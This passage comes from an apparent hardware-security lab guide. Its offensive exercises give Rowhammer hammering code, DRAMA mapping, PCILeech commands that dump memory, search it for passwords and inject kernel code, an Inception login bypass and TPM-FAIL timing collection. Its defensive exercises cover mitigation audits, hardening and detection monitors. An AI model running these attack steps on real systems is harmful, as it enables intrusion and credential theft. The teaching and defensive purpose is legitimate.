    for (int t = 0; t < n_tests; t++) {
        int n_agg = test_counts[t];
        int flips_found = 0;
        int regions_tested = 0;
        
        printf("[*] Testing N=%d aggressors (%d activations total)...\n",
               n_agg, total_activations);
        
        // Test regions within each huge page
        for (size_t hp = 0; hp < total && regions_tested < 100; hp += HUGE_PAGE_SIZE) {
            // Select n_agg aggressor rows spread across the huge page
            // Spacing ensures they're in the same bank but different rows
            size_t spacing = HUGE_PAGE_SIZE / (n_agg + 2);
            if (spacing < ROW_SIZE) spacing = ROW_SIZE;
            
            volatile char *aggressors[24];
            for (int a = 0; a < n_agg; a++) {
                size_t off = (a + 1) * spacing;
                if (off + ROW_SIZE > HUGE_PAGE_SIZE) break;
                aggressors[a] = (volatile char *)(mem + hp + off);
            }
            
            // Victim: row between first two aggressors
            size_t victim_off = spacing + ROW_SIZE;
            volatile char *victim = (volatile char *)(mem + hp + victim_off);
            
            hammer_many_sided(aggressors, n_agg, total_activations);
            
            // Check victim
            for (size_t b = 0; b < ROW_SIZE; b++) {
                if (((uint8_t *)victim)[b] != FILL_PATTERN) {
                    flips_found++;
                }
            }
            
            // Reset
            memset((void *)victim, FILL_PATTERN, ROW_SIZE);
            regions_tested++;
        }
        
        printf("    Result: %d flips in %d regions (%.2f flips/region)\n\n",
               flips_found, regions_tested,
               regions_tested > 0 ? (double)flips_found / regions_tested : 0);
    }
    
    munmap(mem, total);
    return 0;
}
```

**Step 2: Determine TRR counter capacity**

```bash
gcc -O2 -o trrespass trrespass_hammer.c -lrt
sudo ./trrespass

# Interpretation:
# - If flips appear at N=4: TRR has <4 counters (weak TRR)
# - If flips appear at N=12 but not N=8: TRR has ~10-12 counters
# - If flips appear at N=19: standard Samsung/Hynix TRR (16 counters)
# - If no flips at N=24: strong TRR or non-vulnerable DRAM
```

**Verification:** Identifies the minimum aggressor count needed to bypass TRR, revealing the DRAM vendor's counter capacity.

---

### Exercise 6: DRAM Address Reverse-Engineering (DRAMA Technique)

**Objective:** Reverse-engineer the physical-address-to-DRAM mapping using timing-based row-buffer conflict detection.

**Step 1: Build and run the DRAMA probe**

```bash
# Use the pre-built tool from provisioning
sudo /opt/drama_bank_detect

# Or build the full DRAMA toolkit
cd /opt
git clone https://github.com/IAIK/drama || true
cd drama && make
sudo ./drama -n 1000 -o mapping.json
```

**Step 2: Validate bank groupings with known architectures**

```python
#!/usr/bin/env python3
"""validate_dram_mapping.py — Cross-reference discovered mapping with known Intel functions"""
import json
import sys

# Known Intel DDR4 address functions (XOR-based)
# These vary by platform; common for Coffee Lake:
KNOWN_MAPPINGS = {
    "Coffee Lake (dual-channel)": {
        "channel": lambda pa: ((pa >> 7) ^ (pa >> 13) ^ (pa >> 17)) & 1,
        "rank":    lambda pa: (pa >> 16) & 1,
        "bank":    lambda pa: (
            (((pa >> 14) ^ (pa >> 18)) & 1) |
            (((pa >> 15) ^ (pa >> 19)) & 1) << 1 |
            (((pa >> 16) ^ (pa >> 20)) & 1) << 2
        ),
        "row":     lambda pa: (pa >> 17) & 0xFFFF,
    }
}

def analyze_mapping(discovered_groups, phys_addrs):
    """Compare discovered bank groups with known mapping functions"""
    print("[*] Validating discovered mapping against known Intel functions...")
    
    for platform, funcs in KNOWN_MAPPINGS.items():
        matches = 0
        total = 0
        
        for i, addr_i in enumerate(phys_addrs):
            for j, addr_j in enumerate(phys_addrs):
                if i >= j: continue
                total += 1
                
                # Do they conflict according to discovered mapping?
                discovered_same_bank = (discovered_groups[i] == discovered_groups[j])
                
                # Do they conflict according to known function?
                known_same_bank = (
                    funcs["bank"](addr_i) == funcs["bank"](addr_j) and
                    funcs["channel"](addr_i) == funcs["channel"](addr_j) and
                    funcs["rank"](addr_i) == funcs["rank"](addr_j) and
                    funcs["row"](addr_i) != funcs["row"](addr_j)
                )
                
                if discovered_same_bank == known_same_bank:
                    matches += 1
        
        accuracy = matches / total * 100 if total > 0 else 0
        print(f"  {platform}: {accuracy:.1f}% match ({matches}/{total})")
        if accuracy > 90:
            print(f"  >>> MATCH: This system likely uses {platform} mapping")

if __name__ == "__main__":
    print("[*] Load mapping.json from DRAMA output and validate")
    # In practice: load discovered_groups and phys_addrs from DRAMA output
```

**Verification:** Bank groupings match known Intel/AMD XOR-hash functions for the specific platform, enabling targeted Rowhammer.

---

### Exercise 7: DMA Attack via PCILeech and Thunderbolt

**Objective:** Demonstrate physical memory access via DMA over Thunderbolt/PCIe, bypassing OS-level access controls when IOMMU is misconfigured.

**Step 1: Assess DMA attack surface**

```bash
# Check IOMMU status — the critical defense against DMA attacks
dmesg | grep -i "iommu\|dmar\|amd-vi"
grep -oP '(intel_iommu|iommu|amd_iommu)=[^ ]+' /proc/cmdline

# CRITICAL: iommu=pt means passthrough mode — DMA NOT isolated!
# Required for protection: intel_iommu=on iommu=strict (or amd_iommu=on)

# Thunderbolt security level
for dev in /sys/bus/thunderbolt/devices/*/security; do
    echo "$(dirname $dev | xargs basename): $(cat $dev)"
done
# none = vulnerable (DMA on connect)
# user = requires authorization
# secure = requires authorization + key
# dponly = DisplayPort only (safest)

# IOMMU group isolation (multi-device groups = potential bypass)
echo "=== IOMMU Groups with Multiple Devices ==="
for g in /sys/kernel/iommu_groups/*/; do
    devs=($(ls "$g/devices/" 2>/dev/null))
    if [ ${#devs[@]} -gt 1 ]; then
        echo "Group $(basename $g): ${#devs[@]} devices"
        for d in "${devs[@]}"; do
            echo "  - $d: $(lspci -s $(basename $d) 2>/dev/null | head -1)"
        done
    fi
done
```

**Step 2: PCILeech memory dump (requires FPGA hardware)**

```bash
# PCILeech with Screamer or LambdaConcept FPGA
# This demonstrates what an attacker with physical access can do

# Dump first 4 GB of physical memory
pcileech dump -device fpga -min 0 -max 0x100000000 -out memdump.raw

# Search for credentials in memory dump
strings memdump.raw | grep -i "password\|secret\|token" | head -20

# Kernel module injection (if IOMMU is off)
pcileech kmd -kmd LINUX_X64_48 -device fpga
# Post-injection: execute arbitrary kernel code

# Target specific physical address (e.g., kernel credential structure)
pcileech read -device fpga -addr 0xFFFF8800DEADBEEF -len 4096 -out cred.bin
```

**Step 3: Inception tool — authentication bypass via DMA**

```bash
# Inception patches authentication routines in memory via FireWire/Thunderbolt
# Targets: pam_unix.so (Linux), msv1_0.dll (Windows), loginwindow (macOS)

inception --device thunderbolt
# On Linux: patches pam_authenticate() return value → any password accepted
# Requires: Thunderbolt security = none AND no IOMMU
```

**Step 4: Verify DMA protection**

```bash
# Full DMA protection audit
cat << 'EOF' > /tmp/dma_audit.sh
#!/bin/bash
echo "=== DMA Protection Audit ==="
echo ""

# IOMMU
echo "[1] IOMMU Status:"
if dmesg | grep -qi "DMAR: IOMMU enabled"; then
    echo "    Intel VT-d: ENABLED"
elif dmesg | grep -qi "AMD-Vi"; then
    echo "    AMD-Vi: ENABLED"
else
    echo "    WARNING: No IOMMU detected!"
fi

CMDLINE=$(cat /proc/cmdline)
if echo "$CMDLINE" | grep -q "iommu=pt"; then
    echo "    CRITICAL: Passthrough mode (iommu=pt) — DMA NOT isolated!"
elif echo "$CMDLINE" | grep -q "iommu=strict\|intel_iommu=on"; then
    echo "    OK: Strict IOMMU mode"
else
    echo "    WARNING: IOMMU mode unclear — verify configuration"
fi

# Thunderbolt
echo ""
echo "[2] Thunderbolt Security:"
for sec in /sys/bus/thunderbolt/devices/*/security; do
    level=$(cat "$sec" 2>/dev/null)
    case "$level" in
        none)   echo "    CRITICAL: $(basename $(dirname $sec)): NO PROTECTION" ;;
        user)   echo "    OK: $(basename $(dirname $sec)): User authorization required" ;;
        secure) echo "    GOOD: $(basename $(dirname $sec)): Secure (auth + key)" ;;
        dponly) echo "    BEST: $(basename $(dirname $sec)): DisplayPort only" ;;
    esac
done 2>/dev/null || echo "    No Thunderbolt devices detected"

# Kernel DMA protection
echo ""
echo "[3] Kernel DMA Protection:"
cat /sys/bus/thunderbolt/devices/domain0/iommu_dma_protection 2>/dev/null \
    && echo "" || echo "    Status: Unknown (check BIOS 'Kernel DMA Protection')"

echo ""
echo "[4] bolt daemon:"
systemctl is-active bolt 2>/dev/null || echo "    NOT running — no Thunderbolt auth enforcement"
EOF
chmod +x /tmp/dma_audit.sh
bash /tmp/dma_audit.sh
```

**Verification:** Systems with `iommu=strict` and Thunderbolt security level `secure` or `dponly` are protected. Systems with `iommu=pt` or Thunderbolt `none` are vulnerable to DMA attacks.

---

### Exercise 8: TPM Timing Attack (TPM-FAIL Concept)

**Objective:** Demonstrate the TPM-FAIL timing side channel (CVE-2019-11090) by measuring ECDSA signing time variance that leaks nonce bits.

**Step 1: TPM enumeration and key setup**

```bash
# Check TPM type and version
tpm2_getcap properties-fixed | grep -E "TPM_PT_MANUFACTURER|TPM_PT_FIRMWARE"
# Intel fTPM: manufacturer = INTC
# STMicro discrete: manufacturer = STM

# Create ECDSA signing key for timing analysis
tpm2_createprimary -C e -g sha256 -G ecc256:ecdsa -c /tmp/primary.ctx
tpm2_create -C /tmp/primary.ctx -g sha256 -G ecc256:ecdsa \
    -u /tmp/sign.pub -r /tmp/sign.priv
tpm2_load -C /tmp/primary.ctx -u /tmp/sign.pub -r /tmp/sign.priv \
    -c /tmp/sign.ctx

echo "Key created. Ready for timing analysis."
```

**Step 2: Collect timing measurements**

```c
// tpm_timing_collect.c — Measure TPM2_Sign operation timing
// gcc -O2 -o tpm_timing tpm_timing_collect.c -ltss2-esys -ltss2-rc
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <string.h>

// Simplified: use tpm2-tools in subprocess for each sign operation
// Production attack: use direct ESAPI calls for lower latency

#define NUM_SAMPLES 50000
#define HASH_SIZE 32

static inline uint64_t rdtsc_fenced(void) {
    uint32_t lo, hi;
    asm volatile("mfence; rdtscp" : "=a"(lo), "=d"(hi) :: "rcx");
    return ((uint64_t)hi << 32) | lo;
}

int main(void) {
    FILE *fp = fopen("tpm_timings.csv", "w");
    fprintf(fp, "sample,hash_hex,cycles\n");
    
    uint8_t hash[HASH_SIZE];
    char hash_hex[HASH_SIZE * 2 + 1];
    char cmd[512];
    
    printf("[*] Collecting %d TPM2_Sign timing samples...\n", NUM_SAMPLES);
    
    for (int i = 0; i < NUM_SAMPLES; i++) {
        // Generate random hash to sign
        FILE *rng = fopen("/dev/urandom", "r");
        fread(hash, 1, HASH_SIZE, rng);
        fclose(rng);
        
        // Convert to hex
        for (int j = 0; j < HASH_SIZE; j++)
            sprintf(hash_hex + j*2, "%02x", hash[j]);
        
        // Write hash to temp file
        FILE *hf = fopen("/tmp/tpm_hash.bin", "wb");
        fwrite(hash, 1, HASH_SIZE, hf);
        fclose(hf);
        
        // Time the TPM2_Sign operation
        struct timespec t0, t1;
        clock_gettime(CLOCK_MONOTONIC_RAW, &t0);
        
        snprintf(cmd, sizeof(cmd),
            "tpm2_sign -c /tmp/sign.ctx -g sha256 "
            "-o /dev/null /tmp/tpm_hash.bin 2>/dev/null");
        system(cmd);
        
        clock_gettime(CLOCK_MONOTONIC_RAW, &t1);
        
        uint64_t ns = (t1.tv_sec - t0.tv_sec) * 1000000000ULL +
                      (t1.tv_nsec - t0.tv_nsec);
        
        fprintf(fp, "%d,%s,%lu\n", i, hash_hex, ns);
        
        if (i % 5000 == 0)
            printf("[*] Progress: %d/%d samples\n", i, NUM_SAMPLES);
    }
    
    fclose(fp);
    printf("[*] Timing data saved to tpm_timings.csv\n");
    printf("[*] Next: analyze for nonce-bit-dependent timing variation\n");
    return 0;
}
```

**Step 3: Statistical analysis of timing data**

```python
#!/usr/bin/env python3
"""tpm_timing_analysis.py — Detect nonce-dependent timing in TPM ECDSA"""
import numpy as np
import csv
from scipy import stats

timings = []
hashes = []

with open('tpm_timings.csv') as f:
    reader = csv.DictReader(f)
    for row in reader:
        timings.append(int(row['cycles']))
        hashes.append(bytes.fromhex(row['hash_hex']))

timings = np.array(timings)
print(f"[*] Loaded {len(timings)} timing samples")
print(f"[*] Mean: {timings.mean():.0f} ns, Std: {timings.std():.0f} ns")
print(f"[*] Min: {timings.min()} ns, Max: {timings.max()} ns")

# TPM-FAIL exploits timing differences correlated with nonce bit values
# The ECDSA nonce k is generated internally by the TPM
# Non-constant-time scalar multiplication leaks MSB(k) via timing

# Divide samples by timing quartile
q25, q75 = np.percentile(timings, [25, 75])
fast_samples = timings[timings < q25]
slow_samples = timings[timings > q75]

print(f"\n[*] Fast quartile (< {q25:.0f} ns): {len(fast_samples)} samples")
print(f"[*] Slow quartile (> {q75:.0f} ns): {len(slow_samples)} samples")

# T-test: is there a statistically significant timing difference?
t_stat, p_value = stats.ttest_ind(fast_samples, slow_samples)
print(f"\n[*] T-test: t={t_stat:.2f}, p={p_value:.2e}")

if p_value < 0.001:
    print("[!] SIGNIFICANT timing variation detected!")
    print("[!] This TPM may be vulnerable to TPM-FAIL (CVE-2019-11090)")
    print("[*] With ~45,000 samples + lattice reduction (fpLLL/HNP),")
    print("    the ECDSA private key can be recovered.")
else:
    print("[+] No significant timing variation — TPM appears constant-time")
    print("[+] Likely patched firmware or hardware implementation")
```

**Verification:** Vulnerable TPMs (pre-2020 Intel fTPM firmware, pre-patch STMicro) show statistically significant timing variance. Patched TPMs show uniform timing (constant-time scalar multiplication).

---

## PART B: DEFENSIVE (Protection Systems)

### Exercise 9: Hardware Vulnerability Mitigation Audit and Deployment

**Objective:** Audit all hardware vulnerability mitigations, identify gaps, and deploy comprehensive hardening.

**Step 1: Complete vulnerability mitigation audit**

```bash
#!/bin/bash
# hw_vuln_audit.sh — Comprehensive hardware security audit
# Covers: Spectre, Meltdown, MDS, L1TF, Rowhammer, DMA, SGX, PLATYPUS

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║     HARDWARE VULNERABILITY MITIGATION AUDIT                  ║"
echo "║     Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)                            ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

ISSUES=0
WARNINGS=0

check() {
    local name="$1" status="$2" expected="$3"
    if echo "$status" | grep -qi "$expected"; then
        printf "  [PASS] %-35s %s\n" "$name" "$status"
    elif echo "$status" | grep -qi "vulnerable\|not affected"; then
        if echo "$status" | grep -qi "not affected"; then
            printf "  [N/A]  %-35s %s\n" "$name" "$status"
        else
            printf "  [FAIL] %-35s %s\n" "$name" "$status"
            ISSUES=$((ISSUES + 1))
        fi
    else
        printf "  [WARN] %-35s %s\n" "$name" "$status"
        WARNINGS=$((WARNINGS + 1))
    fi
}

echo "═══ 1. CPU Vulnerability Mitigations ═══"
for f in /sys/devices/system/cpu/vulnerabilities/*; do
    name=$(basename "$f")
    status=$(cat "$f" 2>/dev/null || echo "UNAVAILABLE")
    check "$name" "$status" "mitigation\|not affected"
done

echo ""
echo "═══ 2. Microcode Version ═══"
UCODE=$(grep -m1 'microcode' /proc/cpuinfo | awk '{print $NF}')
printf "  Installed: %s\n" "$UCODE"
# Compare against minimum required versions (platform-specific)

echo ""
echo "═══ 3. SMT (Hyper-Threading) Status ═══"
SMT=$(cat /sys/devices/system/cpu/smt/active 2>/dev/null || echo "unknown")
if [ "$SMT" = "1" ]; then
    printf "  [WARN] SMT is ACTIVE — exposes hyper-thread side channels\n"
    printf "         (MDS, L1TF, CacheOut require SMT disabled for full mitigation)\n"
    WARNINGS=$((WARNINGS + 1))
else
    printf "  [PASS] SMT disabled\n"
fi

echo ""
echo "═══ 4. IOMMU / DMA Protection ═══"
if dmesg | grep -qi "DMAR: IOMMU enabled\|AMD-Vi:"; then
    printf "  [PASS] IOMMU: Active\n"
else
    printf "  [FAIL] IOMMU: Not detected or not active!\n"
    ISSUES=$((ISSUES + 1))
fi
if grep -q "iommu=pt" /proc/cmdline; then
    printf "  [FAIL] IOMMU passthrough mode — DMA NOT protected!\n"
    ISSUES=$((ISSUES + 1))
fi

# Thunderbolt
echo ""
echo "═══ 5. Thunderbolt Security ═══"
TB_FOUND=0
for sec in /sys/bus/thunderbolt/devices/*/security 2>/dev/null; do
    TB_FOUND=1
    level=$(cat "$sec")
    dev=$(basename $(dirname "$sec"))
    case "$level" in
        none) printf "  [FAIL] %s: Security=NONE (DMA on connect)\n" "$dev"
              ISSUES=$((ISSUES + 1)) ;;
        user) printf "  [WARN] %s: Security=USER (auth required)\n" "$dev"
              WARNINGS=$((WARNINGS + 1)) ;;
        *)    printf "  [PASS] %s: Security=%s\n" "$dev" "$level" ;;
    esac
done
[ $TB_FOUND -eq 0 ] && printf "  [N/A]  No Thunderbolt ports detected\n"

echo ""
echo "═══ 6. Rowhammer Defenses ═══"
# KSM
KSM=$(cat /sys/kernel/mm/ksm/run 2>/dev/null || echo "N/A")
if [ "$KSM" = "0" ] || [ "$KSM" = "N/A" ]; then
    printf "  [PASS] KSM: Disabled (blocks cross-VM Rowhammer)\n"
else
    printf "  [WARN] KSM: ENABLED — allows cross-VM Rowhammer via page sharing\n"
    WARNINGS=$((WARNINGS + 1))
fi

# THP
THP=$(cat /sys/kernel/mm/transparent_hugepage/enabled 2>/dev/null)
if echo "$THP" | grep -q "\[never\]"; then
    printf "  [PASS] THP: Disabled (blocks Rowhammer physical contiguity)\n"
else
    printf "  [WARN] THP: ENABLED — provides Rowhammer physical contiguity\n"
    WARNINGS=$((WARNINGS + 1))
fi

# ECC
ECC=$(sudo dmidecode -t memory 2>/dev/null | grep "Error Correction" | head -1)
if echo "$ECC" | grep -qi "single\|multi\|chipkill"; then
    printf "  [PASS] ECC: %s\n" "$(echo $ECC | awk -F: '{print $2}')"
else
    printf "  [WARN] ECC: Not detected or None\n"
    WARNINGS=$((WARNINGS + 1))
fi

echo ""
echo "═══ 7. RAPL / Power Side Channel ═══"
PARANOID=$(cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null || echo "0")
if [ "$PARANOID" -ge 3 ]; then
    printf "  [PASS] perf_event_paranoid=%s (blocks PLATYPUS)\n" "$PARANOID"
else
    printf "  [WARN] perf_event_paranoid=%s (PLATYPUS may be possible, need >=3)\n" "$PARANOID"
    WARNINGS=$((WARNINGS + 1))
fi

# RAPL access
if [ -r /sys/class/powercap/intel-rapl:0/energy_uj ]; then
    printf "  [WARN] RAPL energy counter readable by current user\n"
    WARNINGS=$((WARNINGS + 1))
else
    printf "  [PASS] RAPL energy counter restricted\n"
fi

echo ""
echo "═══ 8. Kernel Parameters ═══"
CMDLINE=$(cat /proc/cmdline)
check_param() {
    local param="$1" desc="$2"
    if echo "$CMDLINE" | grep -q "$param"; then
        printf "  [PASS] %s: Present\n" "$desc"
    else
        printf "  [INFO] %s: Not set\n" "$desc"
    fi
}
check_param "mitigations=auto" "All mitigations"
check_param "tsx=off" "TSX disabled (TAA mitigation)"
check_param "nosmt" "SMT disabled"
check_param "intel_iommu=on\|amd_iommu=on" "IOMMU enabled"
check_param "iommu=strict" "IOMMU strict mode"

echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
printf "║  SUMMARY: %d CRITICAL issues, %d WARNINGS                    ║\n" "$ISSUES" "$WARNINGS"
echo "╚══════════════════════════════════════════════════════════════╝"

exit $ISSUES
```

**Step 2: Deploy hardening**

```bash
# Apply comprehensive hardware hardening via GRUB
sudo cp /etc/default/grub /etc/default/grub.bak.$(date +%s)

# Add hardware security parameters
PARAMS="intel_iommu=on iommu=strict tsx=off mitigations=auto"
PARAMS="$PARAMS transparent_hugepage=never"
# For maximum security (with performance cost):
# PARAMS="$PARAMS nosmt l1tf=full,force mds=full,nosmt"

sudo sed -i "s/GRUB_CMDLINE_LINUX=\"\(.*\)\"/GRUB_CMDLINE_LINUX=\"\1 $PARAMS\"/" \
    /etc/default/grub
sudo update-grub

# Sysctl hardening
cat << 'EOF' | sudo tee /etc/sysctl.d/99-hw-security.conf
# Block Rowhammer prerequisites
vm.unprivileged_userfaultfd = 0

# Block PLATYPUS
kernel.perf_event_paranoid = 3

# Restrict dmesg (leaks kernel addresses)
kernel.dmesg_restrict = 1

# Restrict kernel pointer exposure
kernel.kptr_restrict = 2
EOF
sudo sysctl --system

# Disable KSM (cross-VM Rowhammer defense)
echo 0 | sudo tee /sys/kernel/mm/ksm/run

# DMA protection via bolt
sudo apt-get install -y bolt
sudo boltctl policy default deny
```

**Verification:** Re-run the audit script after reboot to confirm all mitigations are active.

---

### Exercise 10: Rowhammer and Hardware Attack Detection System

**Objective:** Deploy a real-time monitoring system that detects Rowhammer attempts, DMA attacks, and hardware anomalies using performance counters, EDAC, and kernel events.

**Step 1: EDAC error rate monitoring**

```bash
#!/bin/bash
# /opt/hw-detection/scripts/edac_monitor.sh
# Monitors ECC correctable errors for Rowhammer detection
# Normal: <1 CE/day; Attack: >10 CE/hour

ALERT_THRESHOLD=10  # CE per hour
SAMPLE_INTERVAL=60  # seconds
LOG="/var/log/hw-security/edac_monitor.log"
mkdir -p "$(dirname $LOG)"

declare -A PREV_CE

echo "[*] EDAC Rowhammer detector started (threshold: ${ALERT_THRESHOLD} CE/hour)"
echo "[*] Logging to $LOG"

while true; do
    TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    
    for mc_dir in /sys/devices/system/edac/mc/mc*/; do
        [ -d "$mc_dir" ] || continue
        MC=$(basename "$mc_dir")
        CE=$(cat "${mc_dir}ce_count" 2>/dev/null || echo 0)
        PREV=${PREV_CE[$MC]:-$CE}
        DELTA=$((CE - PREV))
        
        # Extrapolate to hourly rate
        RATE_HR=$(( DELTA * 3600 / SAMPLE_INTERVAL ))
        
        if [ "$DELTA" -gt 0 ]; then
            echo "$TIMESTAMP $MC: +${DELTA} CE (rate: ${RATE_HR}/hr)" >> "$LOG"
        fi
        
        if [ "$RATE_HR" -gt "$ALERT_THRESHOLD" ]; then
            MSG="ALERT: $MC CE rate=${RATE_HR}/hr exceeds threshold=${ALERT_THRESHOLD}"
            echo "$TIMESTAMP $MSG" >> "$LOG"
            logger -t hw-security -p auth.crit "$MSG"
            
            # Dump per-DIMM breakdown
            for csrow in "${mc_dir}"csrow*/; do
                [ -d "$csrow" ] || continue
                ROW_CE=$(cat "${csrow}ce_count" 2>/dev/null || echo 0)
                echo "  $(basename $csrow): CE=$ROW_CE" >> "$LOG"
            done
            
            # Identify potential offending process
            echo "  Top LLC-miss processes:" >> "$LOG"
            perf top -e LLC-load-misses --max-stack 0 --no-children \
                -n 3 -- sleep 2 2>&1 | head -10 >> "$LOG" 2>/dev/null
        fi
        
        PREV_CE[$MC]=$CE
    done
    
    sleep "$SAMPLE_INTERVAL"
done
```

**Step 2: Performance counter anomaly detection**

```bash
#!/bin/bash
# /opt/hw-detection/scripts/perf_anomaly_monitor.sh
# Detects Rowhammer, cache side channels, and DRAMA probing via perf counters

LOG="/var/log/hw-security/perf_anomaly.log"
INTERVAL=5

# Thresholds (adjust per-system baseline)
LLC_MISS_RATIO_THRESH=0.1     # Normal: <0.01
CLFLUSH_RATE_THRESH=100000    # Normal: ~0

echo "[*] Performance counter anomaly detector started"

while true; do
    TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    
    # Collect counters
    OUTPUT=$(perf stat -e LLC-load-misses,LLC-loads,instructions,cache-misses \
        -a -- sleep "$INTERVAL" 2>&1)
    
    LLC_MISSES=$(echo "$OUTPUT" | grep "LLC-load-misses" | awk '{gsub(/,/,""); print $1}')
    INSTRUCTIONS=$(echo "$OUTPUT" | grep "instructions" | awk '{gsub(/,/,""); print $1}')
    
    # Calculate ratios
    if [ -n "$INSTRUCTIONS" ] && [ "$INSTRUCTIONS" -gt 0 ] 2>/dev/null; then
        RATIO=$(echo "scale=6; ${LLC_MISSES:-0} / $INSTRUCTIONS" | bc 2>/dev/null)
        EXCEEDED=$(echo "${RATIO:-0} > $LLC_MISS_RATIO_THRESH" | bc -l 2>/dev/null)
        
        if [ "${EXCEEDED:-0}" -eq 1 ]; then
            MSG="LLC miss ratio=${RATIO} (threshold=${LLC_MISS_RATIO_THRESH})"
            echo "$TIMESTAMP ALERT: $MSG" | tee -a "$LOG"
            logger -t hw-security -p auth.warning "Anomaly: $MSG"
            
            # Identify top offenders
            echo "  Potential Rowhammer/side-channel process:" >> "$LOG"
            ps aux --sort=-rss | head -5 >> "$LOG"
        fi
    fi
    
    sleep 1  # Brief pause between intervals
done
```

**Step 3: Thunderbolt/DMA device monitoring**

```bash
#!/bin/bash
# /opt/hw-detection/scripts/dma_device_monitor.sh
# Alerts on Thunderbolt device hotplug events

LOG="/var/log/hw-security/dma_events.log"

echo "[*] DMA device monitor started"

# Monitor udev for Thunderbolt/PCIe hotplug
udevadm monitor --subsystem-match=thunderbolt --property 2>/dev/null | while read line; do
    if echo "$line" | grep -q "ACTION=add"; then
        TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
        DEVICE=$(echo "$line" | grep -oP 'DEVPATH=\K[^ ]+')
        MSG="DMA DEVICE CONNECTED: $DEVICE"
        echo "$TIMESTAMP $MSG" | tee -a "$LOG"
        logger -t hw-security -p auth.crit "$MSG"
        
        # Check if device was authorized
        AUTH_PATH="/sys${DEVICE}/authorized"
        if [ -f "$AUTH_PATH" ]; then
            AUTH=$(cat "$AUTH_PATH")
            echo "  Authorization status: $AUTH" >> "$LOG"
            if [ "$AUTH" = "1" ]; then
                echo "  WARNING: Device auto-authorized!" >> "$LOG"
            fi
        fi
    fi
done &

# Fallback: periodic Thunderbolt device check
while true; do
    for dev in /sys/bus/thunderbolt/devices/*/; do
        [ -d "$dev" ] || continue
        AUTH=$(cat "${dev}authorized" 2>/dev/null)
        VENDOR=$(cat "${dev}vendor_name" 2>/dev/null)
        DEVICE=$(cat "${dev}device_name" 2>/dev/null)
        if [ "$AUTH" = "1" ] && [ -n "$VENDOR" ]; then
            # Log connected authorized devices
            :  # Normal operation
        fi
    done
    sleep 30
done
```

**Step 4: Deploy as systemd services**

```bash
# Create systemd unit for EDAC monitor
cat << 'EOF' | sudo tee /etc/systemd/system/hw-edac-monitor.service
[Unit]
Description=EDAC Rowhammer Detection Monitor
After=multi-user.target

[Service]
Type=simple
ExecStart=/opt/hw-detection/scripts/edac_monitor.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Create systemd unit for perf anomaly monitor
cat << 'EOF' | sudo tee /etc/systemd/system/hw-perf-monitor.service
[Unit]
Description=Hardware Performance Counter Anomaly Detector
After=multi-user.target

[Service]
Type=simple
ExecStart=/opt/hw-detection/scripts/perf_anomaly_monitor.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
sudo systemctl daemon-reload
sudo systemctl enable --now hw-edac-monitor hw-perf-monitor
```

**Verification:** Monitors running, logging to `/var/log/hw-security/`. Run Rowhammer Exercise 4 and verify detection alerts are generated.

---

### Exercise 11: SGX Attestation Infrastructure and TEE Hardening

**Objective:** Deploy DCAP attestation verification infrastructure, implement attestation policies, and harden SGX/TDX deployments against known attack classes.

**Step 1: Deploy Intel PCCS (Provisioning Certification Caching Service)**

```bash
# Install PCCS
sudo apt-get install -y sgx-dcap-pccs

# Configure PCCS
sudo cat > /opt/intel/sgx-dcap-pccs/config/default.json << 'EOF'
{
    "HTTPS_PORT": 8081,
    "hosts": "127.0.0.1",
    "uri": "https://api.trustedservices.intel.com/sgx/certification/v4/",
    "ApiKey": "YOUR_INTEL_PCS_API_KEY",
    "proxy": "",
    "RefreshSchedule": "0 0 1 * *",
    "UserTokenHash": "",
    "AdminTokenHash": "",
    "CachingFillMode": "LAZY",
    "LogLevel": "info"
}
EOF

# Generate admin token
ADMIN_TOKEN=$(openssl rand -hex 32)
ADMIN_HASH=$(echo -n "$ADMIN_TOKEN" | sha512sum | awk '{print $1}')
# Update AdminTokenHash in config

sudo systemctl enable --now pccs

# Verify PCCS is operational
curl -sk https://localhost:8081/sgx/certification/v4/rootcacrl | head -c 100
echo ""
echo "[+] PCCS operational"
```

**Step 2: Implement attestation verification policy**

```python
#!/usr/bin/env python3
"""attestation_verifier.py — DCAP quote verification with security policy enforcement"""
import hashlib
import json
import struct
import sys
from datetime import datetime, timezone

class AttestationPolicy:
    """Defines minimum security requirements for enclave attestation"""
    
    # Minimum TCB component SVNs (post-Downfall/GDS fix)
    MIN_TCB_COMPONENTS = {
        'sgxtcbcomp01svn': 14,
        'sgxtcbcomp02svn': 14,
        'pcesvn': 13,
    }
    
    # Allowed enclave measurements (SHA-256 of enclave binary)
    ALLOWED_MRENCLAVES = set()
    
    # Allowed signer identities
    ALLOWED_MRSIGNERS = set()
    
    # Maximum quote age (reject stale quotes)
    MAX_QUOTE_AGE_SECONDS = 300
    
    # Reject debug enclaves in production
    ALLOW_DEBUG = False
    
    # Reject enclaves with provision key access (unless specifically needed)
    ALLOW_PROVISION_KEY = False

    def __init__(self, config_path=None):
        if config_path:
            self.load_config(config_path)
    
    def load_config(self, path):
        with open(path) as f:
            config = json.load(f)
        self.ALLOWED_MRENCLAVES = set(
            bytes.fromhex(m) for m in config.get('allowed_mrenclaves', [])
        )
        self.ALLOWED_MRSIGNERS = set(
            bytes.fromhex(m) for m in config.get('allowed_mrsigners', [])
        )
        self.MIN_TCB_COMPONENTS = config.get('min_tcb', self.MIN_TCB_COMPONENTS)
    
    def verify_quote(self, quote_data: dict) -> tuple:
        """
        Verify a DCAP quote against the security policy.
        Returns (accepted: bool, reason: str, details: dict)
        """
        issues = []
        
        # 1. Check TCB level
        tcb = quote_data.get('tcb_level', {})
        for comp, min_val in self.MIN_TCB_COMPONENTS.items():
            actual = tcb.get(comp, 0)
            if actual < min_val:
                issues.append(
                    f"TCB {comp}={actual} below minimum {min_val} "
                    f"(platform missing security patches)"
                )
        
        # 2. Check enclave measurement
        mrenclave = bytes.fromhex(quote_data.get('mrenclave', ''))
        if self.ALLOWED_MRENCLAVES and mrenclave not in self.ALLOWED_MRENCLAVES:
            issues.append(
